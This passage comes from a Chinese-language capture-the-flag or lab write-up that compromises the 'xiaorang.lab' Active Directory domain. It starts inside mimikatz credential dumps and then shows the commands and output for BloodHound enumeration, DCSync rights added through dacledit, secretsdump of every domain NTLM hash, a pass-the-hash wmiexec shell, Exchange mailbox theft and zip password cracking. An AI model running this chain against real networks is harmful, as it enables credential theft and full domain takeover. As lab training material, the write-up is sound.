	credman :	

Authentication Id : 0 ; 10697326 (00000000:00a33a6e)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/9/20 19:34:13
SID               : S-1-5-90-0-3
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : xiaorang.lab
	 * Password : 05 ad 97 1c 32 13 22 ef a2 7b 3c 51 60 99 60 20 03 b8 75 4b 4c d3 79 cd 0d 15 d6 7e 4c 94 ab 75 0d f5 c4 f5 89 35 3a 1a 02 be 89 b4 10 ce 43 3c f7 1a a7 1f a1 35 b4 4f 91 b7 a6 43 ae 2f 39 70 69 92 1b 19 b4 f3 b6 6f 6d 3d 15 0b d4 19 b0 2b 78 96 46 bf 5f 74 ac 61 8e 6d 9c 5b 84 0d 46 07 96 5e 8e 5b e0 2c 82 a5 4d 15 38 e5 16 a0 2f 74 59 dc 6e b2 c9 c4 ac 3b bc 60 d0 a9 17 b8 a4 c3 6b 5f 8f f1 50 75 0b 3f 19 25 30 69 e7 84 4c 5f 99 45 f1 b2 9e af d2 ad 9f d4 9f 69 6a 72 77 e6 04 d7 ac bf 3d e0 99 b8 e5 c9 d0 16 f9 e3 06 53 12 36 1c 1c dc 36 35 be 1c 32 aa 1c 91 dc 67 5f 4a f8 51 61 de a9 12 ea 4b 3c 7f d8 77 23 97 8a d2 fb 5d 91 d9 77 83 ba fe 14 b6 a3 e8 9a 2e 7b 37 b9 72 9a f8 1d ce 7c f1 0e 06 72 f5 c1 4b a0 
	ssp :	
	credman :	

Authentication Id : 0 ; 10697310 (00000000:00a33a5e)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/9/20 19:34:13
SID               : S-1-5-90-0-3
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : xiaorang.lab
	 * Password : 05 ad 97 1c 32 13 22 ef a2 7b 3c 51 60 99 60 20 03 b8 75 4b 4c d3 79 cd 0d 15 d6 7e 4c 94 ab 75 0d f5 c4 f5 89 35 3a 1a 02 be 89 b4 10 ce 43 3c f7 1a a7 1f a1 35 b4 4f 91 b7 a6 43 ae 2f 39 70 69 92 1b 19 b4 f3 b6 6f 6d 3d 15 0b d4 19 b0 2b 78 96 46 bf 5f 74 ac 61 8e 6d 9c 5b 84 0d 46 07 96 5e 8e 5b e0 2c 82 a5 4d 15 38 e5 16 a0 2f 74 59 dc 6e b2 c9 c4 ac 3b bc 60 d0 a9 17 b8 a4 c3 6b 5f 8f f1 50 75 0b 3f 19 25 30 69 e7 84 4c 5f 99 45 f1 b2 9e af d2 ad 9f d4 9f 69 6a 72 77 e6 04 d7 ac bf 3d e0 99 b8 e5 c9 d0 16 f9 e3 06 53 12 36 1c 1c dc 36 35 be 1c 32 aa 1c 91 dc 67 5f 4a f8 51 61 de a9 12 ea 4b 3c 7f d8 77 23 97 8a d2 fb 5d 91 d9 77 83 ba fe 14 b6 a3 e8 9a 2e 7b 37 b9 72 9a f8 1d ce 7c f1 0e 06 72 f5 c1 4b a0 
	ssp :	
	credman :	

Authentication Id : 0 ; 9200313 (00000000:008c62b9)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 2026/9/20 19:16:45
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : xiaorang.lab
	 * Password : 05 ad 97 1c 32 13 22 ef a2 7b 3c 51 60 99 60 20 03 b8 75 4b 4c d3 79 cd 0d 15 d6 7e 4c 94 ab 75 0d f5 c4 f5 89 35 3a 1a 02 be 89 b4 10 ce 43 3c f7 1a a7 1f a1 35 b4 4f 91 b7 a6 43 ae 2f 39 70 69 92 1b 19 b4 f3 b6 6f 6d 3d 15 0b d4 19 b0 2b 78 96 46 bf 5f 74 ac 61 8e 6d 9c 5b 84 0d 46 07 96 5e 8e 5b e0 2c 82 a5 4d 15 38 e5 16 a0 2f 74 59 dc 6e b2 c9 c4 ac 3b bc 60 d0 a9 17 b8 a4 c3 6b 5f 8f f1 50 75 0b 3f 19 25 30 69 e7 84 4c 5f 99 45 f1 b2 9e af d2 ad 9f d4 9f 69 6a 72 77 e6 04 d7 ac bf 3d e0 99 b8 e5 c9 d0 16 f9 e3 06 53 12 36 1c 1c dc 36 35 be 1c 32 aa 1c 91 dc 67 5f 4a f8 51 61 de a9 12 ea 4b 3c 7f d8 77 23 97 8a d2 fb 5d 91 d9 77 83 ba fe 14 b6 a3 e8 9a 2e 7b 37 b9 72 9a f8 1d ce 7c f1 0e 06 72 f5 c1 4b a0 
	ssp :	
	credman :	

Authentication Id : 0 ; 2512499 (00000000:00265673)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/9/20 18:36:27
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : xiaorang.lab
	 * Password : 05 ad 97 1c 32 13 22 ef a2 7b 3c 51 60 99 60 20 03 b8 75 4b 4c d3 79 cd 0d 15 d6 7e 4c 94 ab 75 0d f5 c4 f5 89 35 3a 1a 02 be 89 b4 10 ce 43 3c f7 1a a7 1f a1 35 b4 4f 91 b7 a6 43 ae 2f 39 70 69 92 1b 19 b4 f3 b6 6f 6d 3d 15 0b d4 19 b0 2b 78 96 46 bf 5f 74 ac 61 8e 6d 9c 5b 84 0d 46 07 96 5e 8e 5b e0 2c 82 a5 4d 15 38 e5 16 a0 2f 74 59 dc 6e b2 c9 c4 ac 3b bc 60 d0 a9 17 b8 a4 c3 6b 5f 8f f1 50 75 0b 3f 19 25 30 69 e7 84 4c 5f 99 45 f1 b2 9e af d2 ad 9f d4 9f 69 6a 72 77 e6 04 d7 ac bf 3d e0 99 b8 e5 c9 d0 16 f9 e3 06 53 12 36 1c 1c dc 36 35 be 1c 32 aa 1c 91 dc 67 5f 4a f8 51 61 de a9 12 ea 4b 3c 7f d8 77 23 97 8a d2 fb 5d 91 d9 77 83 ba fe 14 b6 a3 e8 9a 2e 7b 37 b9 72 9a f8 1d ce 7c f1 0e 06 72 f5 c1 4b a0 
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : XIAORANG-EXC01$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2026/9/20 18:34:31
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : xiaorang-exc01$
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 9023679 (00000000:0089b0bf)
Session           : NetworkCleartext from 0
User Name         : HealthMailbox0d5918e
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2026/9/20 19:10:38
SID               : S-1-5-21-533686307-2117412543-4200729784-1136
	msv :	
	 [00000003] Primary
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG
	 * NTLM     : 502317e49505021d7ffb417540f16f99
	 * SHA1     : 12cddca46972b28bd44e47c0a8055d9ada61a173
	 * DPAPI    : e317a7facc3583213273ef4cea7e9ff9
	tspkg :	
	wdigest :	
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 2557332 (00000000:00270594)
Session           : RemoteInteractive from 2
User Name         : Zhangtong
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2026/9/20 18:36:28
SID               : S-1-5-21-533686307-2117412543-4200729784-1147
	msv :	
	 [00000003] Primary
	 * Username : Zhangtong
	 * Domain   : XIAORANG
	 * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4
	 * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e
	 * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b
	tspkg :	
	wdigest :	
	 * Username : Zhangtong
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : Zhangtong
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 104420 (00000000:000197e4)
Session           : Service from 0
User Name         : Zhangtong
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2026/9/20 18:34:32
SID               : S-1-5-21-533686307-2117412543-4200729784-1147
	msv :	
	 [00000003] Primary
	 * Username : Zhangtong
	 * Domain   : XIAORANG
	 * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4
	 * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e
	 * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b
	tspkg :	
	wdigest :	
	 * Username : Zhangtong
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : Zhangtong
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2026/9/20 18:34:31
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 66384 (00000000:00010350)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/9/20 18:34:31
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : 9587463cfa3fd1ea760c401e2c52e224
	 * SHA1     : 162fc915ffccfa73c6f53b3c92f02690ccf7831c
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : xiaorang.lab
	 * Password : 12 ae e6 f2 22 80 c0 a3 cd 84 c9 94 de ef 96 52 79 ff ea 99 f6 9c 67 48 10 08 e7 99 1a fa 51 11 ad b6 c1 79 cc 6d 04 b2 22 01 47 b0 53 b5 7e ff df 04 21 34 ae 7b ee c9 cf b1 c1 d3 c0 63 d3 d7 6a f2 3a 38 83 ac cf d2 93 7b d3 0b bb d6 a5 8d 7c cd f1 77 65 0b 8c 77 dd 98 49 3c 21 f0 5d fc a7 8f c7 e0 5b f7 96 4d d2 46 14 81 8f 4f a7 a4 27 11 09 03 f9 f4 0d ce 71 4d 8d 64 c3 a9 6b 5c 4a 77 ba ac 33 1a 49 60 11 bd 4d b2 1e 98 05 1a c1 03 5b c6 cf 4e 1c d3 83 10 52 51 68 c4 b1 e0 65 c2 36 f3 a6 3f 66 c6 95 8c 3d 47 ab 9b cb 35 bd 53 f0 6f 13 ae 48 28 5e cf 5b ee 45 ce 7f 10 47 aa e6 f0 d3 09 c0 b3 ad ef 24 00 c5 c8 f0 7f a5 06 93 0e f5 a4 2a ec d0 25 96 4d a4 88 d3 55 94 d9 94 81 ef 8b ba 9e 89 b6 36 dc 88 64 8d 96 
	ssp :	
	credman :	

mimikatz(commandline) # lsadump::sam
Domain : XIAORANG-EXC01
SysKey : 52cd58bcb44860d88b3b68fda24283aa
Local SID : S-1-5-21-804691931-3750513266-524628342

SAMKey : d1e610fe23445707a9c8c8dd27014a43

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 9dca627bdcde6df114a3c4a18a09765d
    lm  - 0: 8f9188e292045aa30b64b85731daf520
    lm  - 1: 6f281d0603d437045369becfcf5255f2
    ntlm- 0: 9dca627bdcde6df114a3c4a18a09765d
    ntlm- 1: 9dca627bdcde6df114a3c4a18a09765d
    ntlm- 2: 9dca627bdcde6df114a3c4a18a09765d

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000003e8 (1000)
User : mj
  Hash NTLM: afffeba176210fad4628f0524bfe1942
    lm  - 0: 4df1389f4b67e1e95c0d496ed6ef7bb4
    ntlm- 0: afffeba176210fad4628f0524bfe1942

mimikatz(commandline) # lsadump::cache
Domain : XIAORANG-EXC01
SysKey : 52cd58bcb44860d88b3b68fda24283aa

Local name : XIAORANG-EXC01 ( S-1-5-21-804691931-3750513266-524628342 )
Domain name : XIAORANG ( S-1-5-21-533686307-2117412543-4200729784 )
Domain FQDN : xiaorang.lab

Policy subsystem is : 1.14
LSA Key(s) : 1, default {83a0f89f-4c49-337e-7789-3bf980f8f58f}
  [00] {83a0f89f-4c49-337e-7789-3bf980f8f58f} 4038a425afb859524da184e7bb4d36834a1aa5dd839ae253757530e912b2bedb

* Iteration is set to default (10240)

[NL$1 - 2022/10/23 15:43:43]
RID       : 000001f4 (500)
User      : XIAORANG\Administrator
MsCacheV2 : c50d707083f6394c2562e48fadda22b8

[NL$2 - 2022/10/23 21:53:04]
RID       : 000001f4 (500)
User      : XIAORANG\Administrator
MsCacheV2 : c50d707083f6394c2562e48fadda22b8

[NL$3 - 2026/9/20 18:56:26]
RID       : 0000047b (1147)
User      : XIAORANG\Zhangtong
MsCacheV2 : 931f2a4343003481495093dd1db539a5

[NL$4 - 2022/10/23 22:25:31]
RID       : 000001f4 (500)
User      : XIAORANG\Administrator
MsCacheV2 : c50d707083f6394c2562e48fadda22b8

[NL$5 - 2022/10/23 22:27:54]
RID       : 000001f4 (500)
User      : XIAORANG\Administrator
MsCacheV2 : c50d707083f6394c2562e48fadda22b8

mimikatz(commandline) # exit
Bye!

```

有机器账户的hash和zhangtong的hash，可以收集下域内信息

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/BloodHound.py]
└─# pc -q python3 bloodhound.py -u "XIAORANG-EXC01$" --hashes :57ea01ab0edb0e8a9f2294600fcbabe9 -d xiaorang.lab -dc XIAORANG-WIN16.xiaorang.lab -c all --dns-tcp -ns 172.22.3.2 --auth-method ntlm --zip                  INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: xiaorang.lab
INFO: Connecting to LDAP server: XIAORANG-WIN16.xiaorang.lab
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: XIAORANG-WIN16.xiaorang.lab
INFO: Found 28 users
INFO: Found 73 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 22 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: XIAORANG-PC.xiaorang.lab
INFO: Querying computer: XIAORANG-EXC01.xiaorang.lab
INFO: Querying computer: XIAORANG-WIN16.xiaorang.lab
INFO: Done in 00M 21S
INFO: Compressing output into 20260920194241_bloodhound.zip
```

<img width="2415" height="1281" alt="Image" src="https://github.com/user-attachments/assets/d960729c-ada9-43c2-be3c-dc09e8f12156" />


可以看到EX01这台机器对域内用户有WriteDacl权限，所以赋予域内一个用户DCsync然后直接打域控即可

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/BloodHound.py]
└─# pc -q impacket-dacledit -action write -rights DCSync -principal Zhangtong -target-dn 'DC=xiaorang,DC=lab' 'xiaorang.lab/XIAORANG-EXC01$' -hashes :57ea01ab0edb0e8a9f2294600fcbabe9 -dc-ip 172.22.3.2
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20260920-195132.bak
[*] DACL modified successfully!
```

然后直接dump全域hash

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/BloodHound.py]
└─# pc -q impacket-secretsdump 'xiaorang.lab/Zhangtong'@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\$431000-7AGO1IPPEUGJ:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_46bc0bcd781047eba:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_2554056e362e45ba9:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_ae8e35b0ca3e41718:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_341e33a8ba4d46c19:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_3d52038e2394452f8:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_2ddd7a0d26c84e7cb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_015b052ab8324b3fa:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_9bd6f16aa25343e68:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_68af2c4169b54d459:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\HealthMailbox8446c5b:1135:aad3b435b51404eeaad3b435b51404ee:6743b82b1feb392408a6fbece086f90b:::
xiaorang.lab\HealthMailbox0d5918e:1136:aad3b435b51404eeaad3b435b51404ee:502317e49505021d7ffb417540f16f99:::
xiaorang.lab\HealthMailboxeda7a84:1137:aad3b435b51404eeaad3b435b51404ee:1e89e23e265bb7b54dc87938b1b1a131:::
xiaorang.lab\HealthMailbox33b01cf:1138:aad3b435b51404eeaad3b435b51404ee:0eff3de35019c2ee10b68f48941ac50d:::
xiaorang.lab\HealthMailbox9570292:1139:aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f:::
xiaorang.lab\HealthMailbox3479a75:1140:aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0:::
xiaorang.lab\HealthMailbox2d45c5b:1141:aad3b435b51404eeaad3b435b51404ee:4822b67394d6d93980f8e681c452be21:::
xiaorang.lab\HealthMailboxec2d542:1142:aad3b435b51404eeaad3b435b51404ee:147734fa059848c67553dc663782e899:::
xiaorang.lab\HealthMailboxf5f7dbd:1143:aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66:::
xiaorang.lab\HealthMailbox67dc103:1144:aad3b435b51404eeaad3b435b51404ee:4fe68d094e3e797cfc4097e5cca772eb:::
xiaorang.lab\HealthMailbox320fc73:1145:aad3b435b51404eeaad3b435b51404ee:0c3d5e9fa0b8e7a830fcf5acaebe2102:::
xiaorang.lab\Lumia:1146:aad3b435b51404eeaad3b435b51404ee:862976f8b23c13529c2fb1428e710296:::
Zhangtong:1147:aad3b435b51404eeaad3b435b51404ee:22c7f81993e96ac83ac2f3f1903de8b4:::
XIAORANG-WIN16$:1000:aad3b435b51404eeaad3b435b51404ee:060c4fe04d931a6dbb552004b4ef1008:::
XIAORANG-EXC01$:1103:aad3b435b51404eeaad3b435b51404ee:57ea01ab0edb0e8a9f2294600fcbabe9:::
XIAORANG-PC$:1104:aad3b435b51404eeaad3b435b51404ee:58e884042659c325bdd890b1a8b6460d:::
```

拿上域管pth就行

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/BloodHound.py]
└─# pc -q impacket-wmiexec xiaorang.lab/administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2  Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
xiaorang\administrator
```

横向到26
```
┌──(root㉿MJ)-[/tmp/test/yunjing/PTH_Exchange]
└─# pc -q python3 pthexchange.py --target https://172.22.3.9 --username "Lumia" --password "00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296" --action Download
2026-09-20 20:02:24,878 - DEBUG - [Stage 777] Get Mails Stage 1 Finditem ing...
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
2026-09-20 20:02:25,859 - DEBUG - [Stage 777] Get Mails Stage 2 GetItem ing...
2026-09-20 20:02:28,341 - DEBUG - [Stage 777] Get Mails Stage 3 Downloaditem ing...
[+] Item [output/item-0.eml] saved successfully
2026-09-20 20:02:28,344 - DEBUG - [Stage 555] Ready Download Attachmenting...
2026-09-20 20:02:28,414 - DEBUG - [Stage 555] Determine if there are attachments in the email...
2026-09-20 20:02:28,414 - DEBUG - [Stage 555] This Mail Has Attachment...
2026-09-20 20:02:28,414 - DEBUG - [Stage 555] Start Get Attachment Content...
2026-09-20 20:02:30,497 - DEBUG - [Stage 555] Start Download Attachment...
[+] Item [output/item-0-secret.zip] saved successfully
2026-09-20 20:02:30,498 - DEBUG - [Stage 777] Get Mails Stage 2 GetItem ing...
2026-09-20 20:02:30,660 - DEBUG - [Stage 777] Get Mails Stage 3 Downloaditem ing...
[+] Item [output/item-1.eml] saved successfully
2026-09-20 20:02:30,660 - DEBUG - [Stage 555] Ready Download Attachmenting...
2026-09-20 20:02:30,718 - DEBUG - [Stage 555] Determine if there are attachments in the email...
2026-09-20 20:02:30,718 - DEBUG - [Stage 555] This Mail Has Attachment...
2026-09-20 20:02:30,718 - DEBUG - [Stage 555] Start Get Attachment Content...
2026-09-20 20:02:31,283 - DEBUG - [Stage 555] Start Download Attachment...
[+] Item [output/item-1-phone lists.csv] saved successfully
```
把lumia所以邮件都拿下来，两个附件secret.zip和phone

Encrypt with your phone number.

意思就手机号就密码

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import csv

input_file = 'item-1-phone lists.csv'
output_file = 'pass.txt'

with open(input_file, 'r', newline='', encoding='utf-8') as f:
    reader = csv.DictReader(f)
    phones = [row['phone'].strip() for row in reader if row['phone'].strip()]

with open(output_file, 'w', encoding='utf-8') as f:
    for phone in phones:
        f.write(phone + '\n')

print(f'已提取 {len(phones)} 个电话号码，写入 {output_file}')
```

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/PTH_Exchange/output]
└─# john hash.txt --wordlist=pass.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)


┌──(root㉿MJ)-[/tmp/test/yunjing/PTH_Exchange/output]
└─# john hash.txt --show
item-0-secret.zip/flag.docx:18763918468:flag.docx:item-0-secret.zip::item-0-secret.zip

1 password hash cracked, 0 left
```

解压即可

<img width="1428" height="918" alt="Image" src="https://github.com/user-attachments/assets/5203a1b8-0c5c-4e34-9b18-7184c8058ea6" />